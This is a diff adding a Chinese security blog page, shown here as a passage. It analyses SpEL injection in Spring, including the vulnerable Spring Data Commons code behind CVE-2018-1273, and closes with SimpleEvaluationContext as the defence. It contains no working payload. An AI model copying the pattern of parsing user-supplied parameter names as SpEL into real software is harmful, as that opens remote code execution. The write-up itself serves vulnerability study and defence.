class="keyword">return</span> HtmlUtils.htmlEscape(value == <span class="keyword">null</span>?<span class="keyword">null</span>:value.toString());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>
+
+<p>其核心思想就是在递归中从 <code>context</code> 下的 <code>message</code> 中取出需要再次递归解析的 <code>$(payload)</code> ，由此来在下一次的解析后去掉 <code>$()</code> 并把其中 <code>payload</code> 当作传入的 <code>name</code> 参数来执行 <code>getValue</code> 操作。</p>
+<h2 id="Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</h2><p><strong>影响版本：</strong>1.13-1.13.10、2.0-2.0.5</p>
+<p>漏洞形成的原因就是当用户在开发中利用了Spring-data-commons中的特性对用户的输入参数进行自动匹配时候，会将用户提交的form表单中的参数名作为SpEL执行。</p>
+<p><strong>漏洞代码：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapPropertyAccessor</span> <span class="keyword">extends</span> <span class="title">AbstractPropertyAccessor</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValue</span><span class="params">(String propertyName, @Nullable Object value)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">           <span class="keyword">if</span> (!<span class="keyword">this</span>.isWritableProperty(propertyName)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(<span class="keyword">this</span>.type, propertyName);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">           &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">               StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">               context.addPropertyAccessor(<span class="keyword">new</span> MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(<span class="keyword">this</span>.type, <span class="keyword">this</span>.conversionService));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">               context.setTypeConverter(<span class="keyword">new</span> StandardTypeConverter(<span class="keyword">this</span>.conversionService));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">               context.setRootObject(<span class="keyword">this</span>.map);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">               Expression expression = PARSER.parseExpression(propertyName);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">               PropertyPath leafProperty = <span class="keyword">this</span>.getPropertyPath(propertyName).getLeafProperty();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">               TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">               TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">               propertyType = propertyName.endsWith(<span class="string">"]"</span>) ? propertyType.getActualType() : propertyType;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">               <span class="keyword">if</span> (propertyType != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.conversionRequired(value, propertyType.getType())) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                   PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">                   <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't find PropertyDescriptor for %s on %s!"</span>, leafProperty.getSegment(), owningType.getType()));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                   MethodParameter methodParameter = <span class="keyword">new</span> MethodParameter(descriptor.getReadMethod(), -<span class="number">1</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">                   TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, <span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">                   <span class="keyword">if</span> (typeDescriptor == <span class="keyword">null</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't obtain type descriptor for method parameter %s!"</span>, methodParameter));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">                   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">                   value = <span class="keyword">this</span>.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">               &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">               expression.setValue(context, value);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">           &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">       &#125;</span></pre></td></tr></table></figure>
+
+<p><strong>开发者使用如下代码：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(method = RequestMethod.POST)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        userForm.validate(binding, userManagement);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (binding.hasErrors()) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="string">"users"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        userManagement.register(<span class="keyword">new</span> Username(userForm.getUsername()), Password.raw(userForm.getPassword()));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        RedirectView redirectView = <span class="keyword">new</span> RedirectView(<span class="string">"redirect:/users"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        redirectView.setPropagateQueryParams(<span class="keyword">true</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">return</span> redirectView;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr></table></figure>
+
+<p>其流程简单上说就是在获取POST过来的参数时候因为要自动绑定进入实体类，所以首先要通过 <code>isWritableProperty</code> 中调用的 <code>getPropertyPath</code> 来判断参数名。如:传来的username参数是否是开发者controller中接收的 <code>UserForm</code> 实体类里的一个属性名。然后把用户传入的参数key即 <code>propertyName</code> 进行 <code>PARSER.parseExpression(propertyName)</code> ，最后 <code>setValue(context,value)</code> 触发了恶意代码。</p>
+<h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><p>因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了 <code>SimpleEvaluationContext</code> 作为安全类来防御该类漏洞。</p>
+<p><strong>参考：</strong></p>
+<p><a href="https://www.codercto.com/a/55517.html" target="_blank" rel="noopener">https://www.codercto.com/a/55517.html</a></p>
+<p><a href="https://www.freebuf.com/vuls/197008.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/197008.html</a></p>
+<p><a href="https://www.jianshu.com/p/ce4ac733a4b9" target="_blank" rel="noopener">https://www.jianshu.com/p/ce4ac733a4b9</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
